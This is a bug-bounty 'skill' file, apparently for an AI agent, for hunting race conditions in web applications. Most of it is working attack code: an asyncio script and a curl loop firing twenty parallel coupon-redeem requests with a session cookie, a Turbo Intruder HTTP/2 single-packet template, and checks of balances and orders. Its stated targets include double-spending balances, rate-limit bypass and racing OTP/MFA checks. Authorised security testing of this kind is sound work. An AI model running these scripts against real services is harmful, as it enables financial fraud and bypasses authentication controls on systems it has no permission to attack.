---
name: k1nzr3c0n-hunt-race-condition
description: "Race condition hunting skill built from 12 disclosed bug bounty reports. HTTP/2 single-packet attack (James Kettle 2023), Turbo Intruder templates, asyncio parallel requests, double-spend patterns. Statistical-sample rule: n≥10 race windows, confirmed state-change, not timing jitter."
tags: [race-condition, hunt, web-security, bug-bounty]
report_count: 12
---

# K1NZR3C0N Hunt — Race Conditions

> **Body-diff required**: state must actually change twice (double-spend, coupon applied twice). Timing difference alone ≠ race.
> **HTTP/2 single-packet**: sends multiple requests in ONE TCP packet to minimize network jitter.

---

## Crown Jewels

```
Priority 1 — Coupon/gift card used multiple times simultaneously (double-spend)
Priority 2 — Account balance race: simultaneous withdrawals exceeding balance
Priority 3 — Rate limit bypass via parallel requests hitting the same counter
Priority 4 — OTP/MFA brute force via race (exhausting valid tokens simultaneously)
Priority 5 — Like/vote race: increment count multiple times from single click
```

---

## Phase 0 — Identify Race Candidates

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_race_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"

# Race condition signals from JS analyst (Phase 7.4)
JS_DIR="/tmp/hunt_js_${TARGET//[^a-zA-Z0-9]/_}/downloaded"
echo "=== Race Condition Signals ==="
[ -d "$JS_DIR" ] && \
  grep -hoP 'Promise\.all\s*\(\s*\[' "$JS_DIR"/*.js 2>/dev/null | wc -l | \
  xargs echo "Promise.all calls (parallel client-side requests):"

# Endpoint candidates
RUNS_BASE="/app/runs"
grep -rhoP 'https?://[^\s"]+(?:apply|use|redeem|transfer|send|withdraw|purchase|vote|like|follow|register|activate|verify|confirm)' \
  "$RUNS_BASE" 2>/dev/null | sort -u | tee "$HUNT/race_candidates.txt" | head -20
```

## Phase 1 — Python Async Race (asyncio)

```bash
echo "=== Python asyncio Race Condition Test ==="
cat > "$HUNT/race_test.py" << 'PYEOF'
import asyncio
import aiohttp
import sys
import json

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "https://example.com/api/coupon/apply"
PAYLOAD = json.loads(sys.argv[2]) if len(sys.argv) > 2 else {"coupon": "SAVE10"}
SESSION_COOKIE = sys.argv[3] if len(sys.argv) > 3 else ""
N_REQUESTS = 20

async def send_request(session, i):
    headers = {"Cookie": SESSION_COOKIE, "Content-Type": "application/json"}
    try:
        async with session.post(TARGET_URL, json=PAYLOAD, headers=headers, ssl=False) as resp:
            body = await resp.text()
            print(f"  [{i:02d}] HTTP {resp.status} | {body[:80]}")
            return resp.status, body
    except Exception as e:
        print(f"  [{i:02d}] ERROR: {e}")
        return None, str(e)

async def main():
    print(f"[*] Sending {N_REQUESTS} simultaneous requests to {TARGET_URL}")
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, i) for i in range(N_REQUESTS)]
        results = await asyncio.gather(*tasks)
    
    # Analyze results
    successes = [(i, r) for i, (s, r) in enumerate(results) if s and s < 400]
    print(f"\n[+] Success responses: {len(successes)}/{N_REQUESTS}")
    if len(successes) > 1:
        print("*** RACE CONDITION DETECTED: multiple requests succeeded ***")

asyncio.run(main())
PYEOF

echo "Usage: python3 $HUNT/race_test.py 'https://${TARGET}/api/coupon/apply' '{\"coupon\":\"SAVE10\"}' 'session=cookie_here'"
echo ""
echo "Running race test against: ${RACE_ENDPOINT:-https://${TARGET}/api/coupon/apply}"
python3 "$HUNT/race_test.py" \
  "${RACE_ENDPOINT:-https://${TARGET}/api/coupon/apply}" \
  "${RACE_PAYLOAD:-{\"coupon\":\"SAVE10\"}}" \
  "${SESSION_COOKIE:-}" 2>/dev/null || echo "Install aiohttp: pip3 install aiohttp"
```

## Phase 2 — curl Parallel Race

```bash
echo "=== curl Parallel Race (20 simultaneous) ==="
RACE_EP="${RACE_ENDPOINT:-https://${TARGET}/api/coupon/apply}"
RACE_DATA="${RACE_DATA:-coupon=SAVE10}"

# Shell parallel (less precise than HTTP/2 single-packet, but no tools needed)
RESULTS=()
for I in $(seq 1 20); do
  curl -sk -X POST "$RACE_EP" \
    -H "Cookie: ${SESSION_COOKIE:-}" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "$RACE_DATA" \
    -w "\n[HTTP %{http_code}]" &
  RESULTS+=($!)
done
wait

echo ""
echo "Check: did coupon apply multiple times? Verify cart total."
```

## Phase 3 — HTTP/2 Single-Packet Attack (Turbo Intruder)

```bash
echo "=== HTTP/2 Single-Packet Attack ==="
echo "For maximum precision, use Burp Suite Turbo Intruder:"
echo ""
echo "Turbo Intruder script template:"
cat << 'TURBO'
# Paste in Turbo Intruder (Burp Extensions)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=20,  # single-packet: all in one TCP frame
                           pipeline=True,
                           engine=Engine.BURP2)  # HTTP/2

    for i in range(20):
        engine.queue(target.req, str(i))

def handleResponse(req, interesting):
    if req.status != 429:
        table.add(req)
TURBO
```

## Phase 4 — Double-Spend Verification

```bash
echo "=== Double-Spend Verification ==="
echo "After race test, verify state in DB/audit log:"
echo ""

# Check account balance / coupon usage
curl -sk "https://${TARGET}/api/user/balance" \
  -H "Cookie: ${SESSION_COOKIE:-}" | python3 -m json.tool 2>/dev/null

curl -sk "https://${TARGET}/api/coupon/history" \
  -H "Cookie: ${SESSION_COOKIE:-}" | python3 -m json.tool 2>/dev/null

curl -sk "https://${TARGET}/api/orders" \
  -H "Cookie: ${SESSION_COOKIE:-}" | python3 -m json.tool 2>/dev/null | \
  grep -E '"status"|"amount"|"discount"' | head -20

echo ""
echo "Compare: did account get discounted MORE than once?"
echo "E.g., balance reduced by 2x, or coupon applied 2+ times in history"
```

## Gate 0

```bash
echo "=== Race Condition Gate 0 ==="
echo "  □ State changed MULTIPLE TIMES in server audit (not just client)"
echo "  □ Coupon applied: cart history shows discount applied Nx"
echo "  □ Double-spend: account debited < total value received"  
echo "  □ n≥10 race windows tried (not just one attempt)"
echo "  □ Consistent reproduction: race succeeds > 2/10 attempts"
echo "  □ Timing jitter rule: 5s delay on one request ≠ race condition"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
Race condition in [/api/coupon/apply] allows applying single-use coupon [SAVE10] multiple times simultaneously (20/20 requests succeeded, cart discount applied 3x)
Double-spend vulnerability in [/api/withdraw]: simultaneous withdrawal requests bypass balance check (withdrew $300 from $100 balance)
```
